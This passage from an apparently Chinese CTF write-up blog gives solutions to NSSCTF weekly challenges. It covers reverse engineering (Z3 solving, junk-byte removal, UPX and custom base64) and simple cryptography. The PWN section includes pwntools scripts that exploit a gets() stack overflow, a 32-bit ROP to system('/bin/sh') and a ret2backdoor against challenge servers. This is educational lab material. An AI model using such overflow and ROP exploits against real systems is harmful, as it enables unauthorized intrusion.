class="number">17</span>]==<span class="number">1160573</span>,</span><br><span class="line"><span class="number">98</span>*flag[<span class="number">11</span>]+<span class="number">138</span>*flag[<span class="number">12</span>]+<span class="number">3584</span>*flag[<span class="number">13</span>]+<span class="number">2136</span>*flag[<span class="number">14</span>]+<span class="number">2712</span>*flag[<span class="number">15</span>]+<span class="number">186</span>*flag[<span class="number">16</span>]+<span class="number">1173</span>*flag[<span class="number">17</span>]==<span class="number">1005746</span>)</span><br><span class="line">S.check()</span><br><span class="line">t = S.model()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>):</span><br><span class="line">    <span class="keyword">try</span>:<span class="built_in">print</span>(t[flag[i]],end=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:<span class="keyword">pass</span></span><br><span class="line">sb = [<span class="number">78</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">112</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">95</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">64</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">95</span>,<span class="number">90</span>,<span class="number">51</span>,<span class="number">125</span>,]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sb:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>NSSCTF{pip_inst@ll_Z3}</p><h3 id="e-sy-flower"><a href="#e-sy-flower" class="headerlink" title="e@sy_flower"></a>e@sy_flower</h3><p>很明显的花指令。</p><p><img src="https://s2.loli.net/2023/08/04/7ncxlk18AupzWwF.png" alt="image-20221023100120874.png"></p><p>一般来说，汇编语言的跳转应该是直接是一个地址，而不会出现+1这种情况，出现这种情况一般是由脏字导致，于是我们把爆红的地方按快捷键u转化为数据，可以看到，D4处是垃圾数据，正常的函数应该是从unk_401D5处开始的，而由于脏字的加入导致反编译失败。</p><p><img src="https://s2.loli.net/2023/08/04/HW5hTlBycGvbi4s.png" alt="image-20221023101053945.png"></p><p>按快捷键c把unk_401D5后的数据转化成代码，同时把垃圾数据nop掉即可，把错误的地方按p重新识别为函数。</p><p><img src="https://s2.loli.net/2023/08/04/8OqfcXL5s2axKlb.png" alt="image-20221023100609377.png"></p><p>主函数编译出来了。加密逻辑就是输入数据的<code>v[2*i-1]</code>和<code>v[2*i]</code>交换后和0x30异或。</p><p><img src="https://s2.loli.net/2023/08/04/pM67YJPsmwUL8Ze.png" alt="image-20221023102052453.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="number">0x63</span>, <span class="number">0x7E</span>, <span class="number">0x73</span>, <span class="number">0x63</span>, <span class="number">0x76</span>, <span class="number">0x64</span>, <span class="number">0x7A</span>, <span class="number">0x4B</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, </span><br><span class="line">      <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x5A</span>, <span class="number">0x5B</span>, <span class="number">0x5E</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, </span><br><span class="line">      <span class="number">0x43</span>, <span class="number">0x55</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, (<span class="built_in">len</span>(<span class="built_in">str</span>)+<span class="number">1</span>)//<span class="number">2</span>):</span><br><span class="line">    temp = <span class="built_in">str</span>[<span class="number">2</span>*i]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i] = <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">str</span>[<span class="number">2</span>*i+<span class="number">1</span>] = temp</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    ans = <span class="built_in">str</span>[i] ^ <span class="number">0x30</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>NSSCTF{Just_junk_Bytess}</p><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h3><p>查壳后发现程序加壳了，是upx3.96。脱壳即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> Str2[<span class="number">160</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">128</span>]; <span class="comment">// [rsp+C0h] [rbp+40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">do_something</span>(Str2, v5);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(enc, Str2) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;yes!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5与str2经过do_something加密后为密文enc</p><p><img src="https://s2.loli.net/2023/08/04/1nLSWzQ7lTeuOv4.png" alt="image-20221021105716955.png"></p><p>很明显的换表base64加密。</p><p>密文enc=’tLntq1rgE1vqwf8XC19Zmf8Zyxn5Fq==’那么经过换表base64解迷2就是flag了。</p><p>NSSCTF{UPX_1s_s0_3asy}</p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>提示要点99999999下才能拿到flag，ce找基址然后改内存即可。</p><p><img src="https://s2.loli.net/2023/08/04/qungbR1waKZBMzQ.png" alt="image-20221021110552499.png"></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Week1-1"><a href="#Week1-1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>Source</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input something&quot;</span>);</span><br><span class="line">    <span class="type">char</span> name[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> number=<span class="number">0</span>;</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">if</span>(number!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You win.&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets存在栈溢出，gdb一下，可以看到cmp是拿[rbp - 4]即0x8c的值和0进行比较，那么可以推断出number的值就是存在这个地址里，栈顶rsp为0x60距离0x8c有0x2c个单位，那么就要存入0x2d个1就能覆盖number的值。就拿到flag了。</p><p><img src="https://s2.loli.net/2023/08/04/kEYbJ58wLDK2Pe1.png" alt="image-20221014112957850.png"></p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">sh = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28048</span>)</span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x2d</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>ezcmp</p><p>给源文件了，基本逻辑就是buff经过enccrypto加密。我们输入密文就能得到shell。</p><p><img src="https://s2.loli.net/2023/08/04/Es45f62SiXdo1Cw.png" alt="image-20221027104049616.png"></p><p>源文件已经给我们了，直接写脚本即可，注意要&amp;0xff得到byte形式的密文（有不可见字符），要不然打不通。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buff[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> v0;</span><br><span class="line"><span class="type">char</span> buffff[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234&quot;</span>;</span><br><span class="line"><span class="type">char</span> bua[] = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz4321&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> *<span class="title">enccrypt</span><span class="params">(<span class="type">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a = <span class="built_in">rand</span>();</span><br><span class="line">        buf[i] ^= buffff[i];</span><br><span class="line">        buff[i] ^= bua[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[j] = buff[i];</span><br><span class="line">            buf[i] += <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        buf[i] -= ((bua[i] ^ <span class="number">0x30</span>) * (buffff[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">1</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">        buf[i] += (a % buff[i]) &amp; <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[] = <span class="string">&quot;Ayaka_nbbbbbbbbbbbbbbbbb_pluss&quot;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, buf);</span><br><span class="line">    <span class="type">char</span> test[<span class="number">30</span>];</span><br><span class="line">    <span class="type">int</span> v0 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">srand</span>(v0);</span><br><span class="line">    <span class="built_in">enccrypt</span>(buff);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, buff[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windows和linux平台跑出来的结果不一样，用gcc编译。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28967</span>)</span><br><span class="line">playload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">0x72</span>,<span class="number">0x40</span>,<span class="number">0xe</span>,<span class="number">0xdc</span>,<span class="number">0xaa</span>,<span class="number">0x78</span>,<span class="number">0x46</span>,<span class="number">0x14</span>,<span class="number">0xe2</span>,<span class="number">0xb0</span>,<span class="number">0x7e</span>,<span class="number">0x4c</span>,<span class="number">0x1a</span>,<span class="number">0xe8</span>,<span class="number">0xb6</span>,<span class="number">0x84</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0xee</span>,<span class="number">0xbc</span>,<span class="number">0x8a</span>,<span class="number">0x58</span>,<span class="number">0x26</span>,<span class="number">0xf4</span>,<span class="number">0xc2</span>,<span class="number">0x90</span>,<span class="number">0x5e</span>,<span class="number">0x2c</span>,<span class="number">0xcb</span>,<span class="number">0xc8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    playload += <span class="built_in">chr</span>(i)</span><br><span class="line">p.sendline(playload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezr0p32"><a href="#ezr0p32" class="headerlink" title="ezr0p32"></a>ezr0p32</h3><p><img src="https://s2.loli.net/2023/08/04/jLfoiKIrWtnyAgp.png" alt="image-20221027104820709.png"></p><p>有两个read函数，rop32不需要泄露libc地址，system函数在题中已经给出，我们在第一个read写入/bin/sh即可。</p><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;43.143.7.97&#x27;</span>,<span class="number">28131</span>)</span><br><span class="line">system_addr = <span class="number">0x08048562</span></span><br><span class="line">bin_addr = <span class="number">0x0804A080</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x1c</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(bin_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;now it&#x27;s your play time~\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ez-backdoor"><a href="#ez-backdoor" class="headerlink" title="ez_backdoor"></a>ez_backdoor</h3><p>主函数，可以看到vnln里面，read(0, buf, 0x140uLL);存在溢出。覆盖返回地址即可。</p><p><img src="https://s2.loli.net/2023/08/04/EsRMujK2F5nXlZP.png" alt="image-20221020145647559.png"></p><p>后门函数的地址在0x4011d2，溢出量为0x100。</p><p><img src="https://s2.loli.net/2023/08/04/dvQ9Meh5U4GtrzW.png" alt="image-20221020145810487.png"></p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;43.143.7.127&#x27;,28064)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x100 + 0x8) + p64(0x4011d2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Week1-2"><a href="#Week1-2" class="headerlink" title="Week1"></a>Week1</h2><h3 id="baBAbaseSEse"><a href="#baBAbaseSEse" class="headerlink" title="baBAbaseSEse"></a>baBAbaseSEse</h3><p>base套娃，basecrcak一把梭。</p><p><img src="https://s2.loli.net/2023/08/04/biazNoIRK1LMvwp.png" alt="image-20221030103002488.png"></p><h3 id="A-dictator"><a href="#A-dictator" class="headerlink" title="A dictator"></a>A dictator</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">offset = randint(<span class="number">1</span>,<span class="number">100</span>) % <span class="number">26</span></span><br><span class="line"><span class="comment"># print(offset)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="built_in">ord</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        index = <span class="built_in">ord</span>(char)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        new_char = <span class="built_in">chr</span>((index+offset)%<span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(new_char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># lzw_uswksj_uahzwj_ak_gfw_gx_lzw_egkl_tskau_udskkausd_uahzwjk</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>经典凯撒，枚举即可。</p><h3 id="littleprince"><a href="#littleprince" class="headerlink" title="littleprince"></a>littleprince</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> a&gt;&gt;b|(a&amp;((<span class="number">1</span>&lt;&lt;b)-<span class="number">1</span>))&lt;&lt;(c-b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outp</span>(<span class="params">x,h</span>):</span><br><span class="line">    p=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    q=randint(<span class="number">1</span>&lt;&lt;h,<span class="number">1</span>&lt;&lt;h+<span class="number">1</span>)</span><br><span class="line">    c1,c2=x%p,x%q</span><br><span class="line">    <span class="built_in">print</span>(p,q,c1,c2)</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">m_len=m.bit_length()</span><br><span class="line">d,h,st=<span class="number">32</span>,<span class="number">16</span>,<span class="number">32</span></span><br><span class="line">r=m_len%d</span><br><span class="line"><span class="keyword">assert</span>(r&gt;h)</span><br><span class="line"><span class="keyword">while</span> st&lt;=m_len:</span><br><span class="line">    x=enc(m,st,m_len)</span><br><span class="line">    x&gt;&gt;=(m_len-d)</span><br><span class="line">    outp(x,h)</span><br><span class="line">    st+=d</span><br><span class="line">m&gt;&gt;=(m_len-r)</span><br><span class="line">outp(m,h)</span><br></pre></td></tr></table></figure><p>output</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">58831 56263 46164 34042</span><br><span class="line">55579 48157 2944 35950</span><br><span class="line">35507 38933 1938 2559</span><br><span class="line">63419 51803 24116 33843</span><br><span class="line">40423 47237 20923 43307</span><br><span class="line">33599 43441 4324 37076</span><br><span class="line">43541 40771 42833 32799</span><br><span class="line">54869 40031 21847 16617</span><br><span class="line">48953 34841 36031 3788</span><br><span class="line">34403 58271 12464 55665</span><br><span class="line">33457 61463 3512 47396</span><br><span class="line">53047 57283 185 38171</span><br><span class="line">52583 59281 45851 38603</span><br><span class="line">60727 58043 36261 37164</span><br></pre></td></tr></table></figure><p>给了hint</p><p>hint:When we generate two numbers, there may be a coincidence that they are coprime.</p><p>求一下公约数,没有。中国剩余定理求一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">cipher, n</span>):</span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, (i <span class="keyword">for</span> i <span class="keyword">in</span> n))</span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    data = <span class="built_in">zip</span>(cipher, n)</span><br><span class="line">    <span class="keyword">for</span> ci, ni <span class="keyword">in</span> data:</span><br><span class="line">        Ni = N // ni</span><br><span class="line">        di = gmpy2.invert(Ni, ni)</span><br><span class="line">        result += ci * Ni * di</span><br><span class="line">    <span class="keyword">return</span> result % N, N</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.readlines()[::-<span class="number">1</span>]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">flag_bin=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> data:</span><br><span class="line">    c_list = []</span><br><span class="line">    n_list = []</span><br><span class="line">    tmp = t.strip(<span class="string">&quot;\n&quot;</span>).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">2</span>]))</span><br><span class="line">    c_list.append(<span class="built_in">int</span>(tmp[<span class="number">3</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">0</span>]))</span><br><span class="line">    n_list.append(<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    x, N = CRT(c_list, n_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(x),long_to_bytes(<span class="built_in">int</span>(x)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(x) &lt;<span class="number">618357700</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x) + <span class="built_in">int</span>(tmp[<span class="number">0</span>])*<span class="built_in">int</span>(tmp[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += long_to_bytes(<span class="built_in">int</span>(x))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="XXXOOORRR"><a href="#XXXOOORRR" class="headerlink" title="XXXOOORRR"></a>XXXOOORRR</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> 